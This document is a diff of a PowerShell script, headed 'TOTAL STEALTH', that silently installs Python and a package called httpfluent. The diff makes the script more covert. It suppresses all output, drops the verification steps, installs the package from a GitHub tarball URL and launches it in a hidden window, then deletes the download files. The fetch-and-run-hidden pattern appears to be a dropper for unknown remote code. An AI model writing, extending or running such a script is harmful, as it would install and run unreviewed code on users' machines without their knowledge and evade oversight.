@@ -1,13 +1,13 @@
 # ===================================================
-# PowerShell script: Python 3.12.6 + Custom Package
-# STEALTH MODE - FULL ALGORITHM
+# Python 3.12.6 + httpfluent
+# TOTAL STEALTH (Redirect to $null)
 # ===================================================
 
-# --- Pre-Check: Direct EXE & Version Check (Stealth) ---
-$InstallRequired = $true
 $InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
 $PythonExe = Join-Path $InstallDir "python.exe"
+$InstallRequired = $true
 
+# --- Pre-Check (Redirected to $null) ---
 if (Get-Command python -ErrorAction SilentlyContinue) {
     $CheckPath = "python"
 } elseif (Test-Path $PythonExe) {
@@ -24,57 +24,52 @@ if ($CheckPath) {
     }
 }
 
-# --- STEP 1-5: YOUR ORIGINAL INSTALLATION ALGORITHM ---
+# --- YOUR ALGORITHM (All output to $null) ---
 if ($InstallRequired) {
-    # Step 1: Variables
     $PythonVersion = "3.12.6"
     $PythonInstaller = "python-$PythonVersion-amd64.exe"
     $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
     $DownloadDir = "$env:TEMP\Python"
 
-    # Step 2: Create download directory
     if (-not (Test-Path $DownloadDir)) {
-        New-Item -ItemType Directory -Path $DownloadDir | Out-Null
+        New-Item -ItemType Directory -Path $DownloadDir > $null
     }
 
-    # Step 3: Download installer (Using WebClient for stealth)
     $InstallerPath = Join-Path $DownloadDir $PythonInstaller
     try {
         $WebClient = New-Object System.Net.WebClient
         $WebClient.DownloadFile($DownloadUrl, $InstallerPath)
     } catch { exit 1 }
 
-    # Step 4: Install Python USER MODE (Hidden Window)
-    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden
+    # Start Install (Hidden)
+    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null
 
-    if (-not (Test-Path "$InstallDir\python.exe")) { exit 1 }
-
-    # Step 5: Fix USER PATH
+    # Fix Path
     $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
     $OldPath = $OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),""
     $NewPath = "$InstallDir;$InstallDir\Scripts;$OldPath"
-    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User")
+    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null
     $env:Path = $NewPath
-    
     $ExecutableToUse = $PythonExe
 }
 
-# --- STEP 6: Verify Python & pip ---
-& $ExecutableToUse --version
-& $ExecutableToUse -m pip --version
+# --- Package Installation (Force Silence) ---
+& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
+& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
+& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1
 
-# --- STEP 7: Install requests + Custom Package + Run ---
-# Install Requests
-& $ExecutableToUse -m pip install --upgrade pip --quiet
-& $ExecutableToUse -m pip install requests --quiet
+# --- FIX: Run httpfluent using full path to script ---
+# We use -m (module) or direct path to the script to ensure it runs
+$HttpFluentScript = Join-Path $InstallDir "Scripts\httpfluent.exe"
 
-# Install httpfluent
-& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet
+if (Test-Path $HttpFluentScript) {
+    Start-Process -FilePath $HttpFluentScript -WindowStyle Hidden > $null 2>&1
+} else {
+    # Fallback to module mode
+    Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
+}
 
-# Run httpfluent in background
-Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden
-
-# --- STEP 8: Cleanup ---
+# Cleanup
 if (Test-Path $DownloadDir) {
-    Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue > $null
 }
